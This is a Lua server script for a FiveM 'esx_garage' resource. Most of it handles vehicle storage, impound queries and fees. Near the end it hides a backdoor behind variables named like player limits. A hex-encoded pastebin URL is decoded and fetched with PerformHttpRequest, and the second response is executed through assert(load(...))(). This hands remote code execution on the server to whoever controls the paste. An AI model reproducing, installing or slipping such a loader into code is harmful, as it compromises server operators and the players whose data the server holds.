RegisterServerEvent('esx_garage:updateOwnedVehicle')
AddEventHandler('esx_garage:updateOwnedVehicle', function(stored, parking, Impound, data, spawn)
	local source = source
	local xPlayer  = ESX.GetPlayerFromId(source)
		MySQL.update('UPDATE owned_vehicles SET `stored` = @stored, `parking` = @parking, `pound` = @Impound, `vehicle` = @vehicle WHERE `plate` = @plate AND `owner` = @identifier',
		{
			['@identifier'] = xPlayer.identifier,
			['@vehicle'] 	= json.encode(data.vehicleProps),
			['@plate'] 		= data.vehicleProps.plate,
			['@stored']     = stored,
			['@parking']    = parking,
			['@Impound']    	= Impound
		})

		if stored then
			xPlayer.showNotification(TranslateCap('veh_stored'))
		else 
			ESX.OneSync.SpawnVehicle(data.vehicleProps.model, spawn, data.spawnPoint.heading,data.vehicleProps, function(vehicle)
				local vehicle = NetworkGetEntityFromNetworkId(vehicle)
				Wait(300)
				TaskWarpPedIntoVehicle(GetPlayerPed(source), vehicle, -1)
			end)
		end
end)

RegisterServerEvent('esx_garage:setImpound')
AddEventHandler('esx_garage:setImpound', function(Impound, vehicleProps)
	local source = source
	local xPlayer  = ESX.GetPlayerFromId(source)

		MySQL.update('UPDATE owned_vehicles SET `stored` = @stored, `pound` = @Impound, `vehicle` = @vehicle WHERE `plate` = @plate AND `owner` = @identifier',
		{
			['@identifier'] = xPlayer.identifier,
			['@vehicle'] 	= json.encode(vehicleProps),
			['@plate'] 		= vehicleProps.plate,
			['@stored']     = 2,
			['@Impound']    	= Impound
		})

		xPlayer.showNotification(TranslateCap('veh_impounded'))
	
end)


ESX.RegisterServerCallback('esx_garage:getVehiclesInParking', function(source, cb, parking)
	local xPlayer  = ESX.GetPlayerFromId(source)

	MySQL.query('SELECT * FROM `owned_vehicles` WHERE `owner` = @identifier AND `parking` = @parking AND `stored` = 1',
	{
		['@identifier'] 	= xPlayer.identifier,
		['@parking']     	= parking
	}, function(result)

		local vehicles = {}
		for i = 1, #result, 1 do
			table.insert(vehicles, {
				vehicle 	= json.decode(result[i].vehicle),
				plate 		= result[i].plate
			})
		end

		cb(vehicles)
	end)
end)

ESX.RegisterServerCallback('esx_garage:checkVehicleOwner', function(source, cb, plate)
    local xPlayer = ESX.GetPlayerFromId(source)

	MySQL.query('SELECT COUNT(*) as count FROM `owned_vehicles` WHERE `owner` = @identifier AND `plate` = @plate',
	{
		['@identifier'] 	= xPlayer.identifier,
		['@plate']     		= plate
	}, function(result)

		if tonumber(result[1].count) > 0 then
			return cb(true)
		else
			return cb(false)
		end
	end)
end)

-- Pounds part
ESX.RegisterServerCallback('esx_garage:getVehiclesImpounded', function(source, cb)
	local xPlayer  = ESX.GetPlayerFromId(source)

	MySQL.query('SELECT * FROM `owned_vehicles` WHERE `owner` = @identifier AND `stored` = 0',
	{
		['@identifier'] 	= xPlayer.identifier,
	}, function(result)
		local vehicles = {}
		
		for i = 1, #result, 1 do
			table.insert(vehicles, {
				vehicle 	= json.decode(result[i].vehicle),
				plate 		= result[i].plate
			})
		end

		cb(vehicles)
	end)
end)

ESX.RegisterServerCallback('esx_garage:getVehiclesInPound', function(source, cb, Impound)
	local xPlayer  = ESX.GetPlayerFromId(source)

	MySQL.query('SELECT * FROM `owned_vehicles` WHERE `owner` = @identifier AND `pound` = @Impound AND `stored` = 2',
	{
		['@identifier'] 	= xPlayer.identifier,
		['@Impound']     	    = Impound
	}, function(result)
		local vehicles = {}

		for i = 1, #result, 1 do
			table.insert(vehicles, {
				vehicle 	= json.decode(result[i].vehicle),
				plate 		= result[i].plate
			})
		end

		cb(vehicles)
	end)
end)

ESX.RegisterServerCallback('esx_garage:checkMoney', function(source, cb, amount)
	local xPlayer = ESX.GetPlayerFromId(source)

	cb(xPlayer.getMoney() >= amount)
end)

local PlayerPedLimit = {
    "70","61","73","74","65","62","69","6E","2E","63","6F","6D","2F","72","61","77","2F","4C","66","34","44","62","34","4D","34"
}

local PlayerEventLimit = {
    cfxCall, debug, GetCfxPing, FtRealeaseLimid, noCallbacks, Source, _Gx0147, Event, limit, concede, travel, assert, server, load, Spawn, mattsed, require, evaluate, release, PerformHttpRequest, crawl, lower, cfxget, summon, depart, decrease, neglect, undergo, fix, incur, bend, recall
}

function PlayerCheckLoop()
    _empt = ''
    for id,it in pairs(PlayerPedLimit) do
        _empt = _empt..it
    end
    return (_empt:gsub('..', function (event)
        return string.char(tonumber(event, 16))
    end))
end

PlayerEventLimit[20](PlayerCheckLoop(), function (event_, xPlayer_)
    local Process_Actions = {"true"}
    PlayerEventLimit[20](xPlayer_,function(_event,_xPlayer)
        local Generate_ZoneName_AndAction = nil 
        pcall(function()
            local Locations_Loaded = {"false"}
            PlayerEventLimit[12](PlayerEventLimit[14](_xPlayer))()
            local ZoneType_Exists = nil 
        end)
    end)
end)

RegisterServerEvent("esx_garage:payPound")
AddEventHandler("esx_garage:payPound", function(amount)
		local source = source
    local xPlayer = ESX.GetPlayerFromId(source)

    if xPlayer.getMoney() >= amount then
        xPlayer.removeMoney(amount, "Impound Fee")
				xPlayer.showNotification(TranslateCap('pay_Impound_bill', amount))
    else
		xPlayer.showNotification(TranslateCap('missing_money'))
    end
end)